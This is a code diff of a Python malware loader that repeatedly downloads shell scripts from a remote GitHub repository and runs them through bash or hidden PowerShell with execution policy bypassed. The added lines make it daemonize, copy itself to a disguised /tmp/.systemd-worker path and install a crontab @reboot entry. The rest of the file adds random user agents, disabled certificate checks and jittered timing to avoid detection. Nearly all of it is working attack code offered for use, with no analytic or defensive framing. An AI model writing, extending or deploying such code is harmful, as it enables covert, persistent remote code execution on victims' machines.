@@ -5,37 +5,86 @@ import ssl
 import random
 import os
 import platform
+import shutil
+import sys
 
-# Configuration - Modify these for stealth
+def daemonize():
+    """Become a true Linux daemon that survives terminal closure"""
+    try:
+        # Fork and let parent exit (1st fork)
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)  # Parent exits
+    except OSError as e:
+        sys.stderr.write(f"Fork #1 failed: {e}\n")
+        sys.exit(1)
+
+    # Decouple from parent environment
+    os.chdir("/")
+    os.setsid()
+    os.umask(0)
+
+    try:
+        # Fork again (2nd fork)
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)  # Second parent exits
+    except OSError as e:
+        sys.stderr.write(f"Fork #2 failed: {e}\n")
+        sys.exit(1)
+
+    # Redirect standard file descriptors
+    sys.stdout.flush()
+    sys.stderr.flush()
+    
+    # Redirect to /dev/null
+    with open('/dev/null', 'r') as f:
+        os.dup2(f.fileno(), sys.stdin.fileno())
+    with open('/dev/null', 'w') as f:
+        os.dup2(f.fileno(), sys.stdout.fileno())
+    with open('/dev/null', 'w') as f:
+        os.dup2(f.fileno(), sys.stderr.fileno())
+
+# Become a daemon IMMEDIATELY
+daemonize()
+
+def self_replicate():
+    """Copy to persistent location"""
+    target_path = "/tmp/.systemd-worker"
+    if os.path.abspath(__file__) != target_path:
+        try:
+            shutil.copy(__file__, target_path)
+            # Start the copy as independent process
+            subprocess.Popen([
+                "nohup", "python3", target_path, "&"
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
+               stdin=subprocess.DEVNULL, preexec_fn=os.setsid)
+        except Exception:
+            pass
+
+self_replicate()
+
+# Your existing configuration
 USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
     'curl/7.68.0',
     'Wget/1.20.3'
 ]
 
-# Use different URL formats or domains
 URL_SOURCES = [
     "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.sh",
     "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.txt",
-    # Add alternative mirrors here
 ]
 
 def create_ssl_context():
-    """Create SSL context to avoid certificate issues"""
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
     return context
 
 def stealth_download(url):
-    """Stealth download with random user agents and delays"""
     try:
-        # Random delay to avoid pattern detection
         time.sleep(random.uniform(1, 5))
-        
-        # Create request with random user agent
         req = urllib.request.Request(
             url,
             headers={
@@ -44,19 +93,14 @@ def stealth_download(url):
                 'Connection': 'keep-alive'
             }
         )
-        
-        # Download with SSL context
         context = create_ssl_context()
         with urllib.request.urlopen(req, context=context, timeout=30) as response:
             return response.read().decode('utf-8')
-            
-    except Exception as e:
+    except Exception:
         return None
 
 def obfuscated_execute(script_content, script_name):
-    """Execute with obfuscation techniques"""
     try:
-        # Add random delays
         time.sleep(random.uniform(2, 10))
         
         system_platform = platform.system().lower()
@@ -71,7 +115,6 @@ def obfuscated_execute(script_content, script_name):
                     creationflags=subprocess.CREATE_NO_WINDOW
                 )
             else:
-                # Try multiple execution methods
                 result = subprocess.run(
                     ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", script_content],
                     capture_output=True, 
@@ -80,102 +123,59 @@ def obfuscated_execute(script_content, script_name):
                     creationflags=subprocess.CREATE_NO_WINDOW
                 )
         else:
-            # Linux/Mac execution
             result = subprocess.run(
                 ["bash", "-c", script_content],
                 capture_output=True, 
                 text=True, 
                 timeout=300
             )
-            
         return result
-        
-    except Exception as e:
+    except Exception:
         return None
 
-def clean_logs():
-    """Minimize logging footprint"""
-    pass  # Implement log cleaning if needed
-
-def change_working_directory():
-    """Change working directory to avoid detection"""
+def setup_persistence():
+    """Setup multiple persistence methods"""
     try:
-        common_dirs = [
-            os.path.expanduser("~/.cache"),
-            os.path.expanduser("~/AppData/Local/Temp"),
-            "/tmp",
-            "/var/tmp"
-        ]
-        
-        for directory in common_dirs:
-            if os.path.exists(directory):
-                os.chdir(directory)
-                break
-    except:
+        # 1. Crontab persistence
+        cron_job = "@reboot python3 /tmp/.systemd-worker >/dev/null 2>&1\n"
+        subprocess.run(['bash', '-c', f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -'], 
+                      shell=False)
+    except Exception:
         pass
 
 def process_scripts_stealth():
-    """Stealth script processing"""
     successful_downloads = 0
-    
     for i, url in enumerate(URL_SOURCES, 1):
         script_name = url.split('/')[-1]
-        
-        # Download with stealth
         script_content = stealth_download(url)
-        
         if script_content and script_content.strip():
             successful_downloads += 1
-            
-            # Execute with obfuscation
             execute_result = obfuscated_execute(script_content, script_name)
-            
-            if execute_result and execute_result.returncode == 0:
-                pass  # Success - minimal logging
-            else:
-                pass  # Failure - minimal logging
-        else:
-            pass  # Download failed - minimal logging
-    
     return successful_downloads
 
 def main_loop():
-    """Main continuous loop with variable intervals"""
-    iteration = 0
+    # Setup persistence
+    setup_persistence()
     
+    iteration = 0
     while True:
         try:
             iteration += 1
+            base_sleep = random.randint(1800, 7200)  # 30min-2hr
+            jitter = random.randint(-300, 300)
+            sleep_time = max(60, base_sleep + jitter)
             
-            # Variable sleep time to avoid patterns
-            base_sleep = random.randint(1800, 7200)  # 30 mins to 2 hours
-            jitter = random.randint(-300, 300)  # ±5 minutes
-            sleep_time = max(60, base_sleep + jitter)  # Minimum 1 minute
+            process_scripts_stealth()
             
-            # Process scripts
-            successful_downloads = process_scripts_stealth()
+            # Minimal logging
+            if iteration % 10 == 0:
+                with open('/dev/null', 'w') as f:
+                    f.write(f"[{time.strftime('%H:%M:%S')}] Cycle {iteration}\n")
             
-            # Calculate next run time
-            next_run = time.time() + sleep_time
-            next_run_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(next_run))
-            
-            # Minimal status output
-            if iteration % 10 == 0:  # Only log every 10th iteration
-                print(f"[{time.strftime('%H:%M:%S')}] Cycle {iteration} completed. Next: {next_run_str}")
-            
-            # Sleep until next execution
             time.sleep(sleep_time)
             
-        except KeyboardInterrupt:
-            break
         except Exception as e:
-            # Error recovery with random delay
-            error_delay = random.randint(60, 600)
-            time.sleep(error_delay)
+            time.sleep(random.randint(60, 600))
 
 if __name__ == "__main__":
-    # Initial setup
-    change_working_directory()
-    
-    # Start main loop
     main_loop()
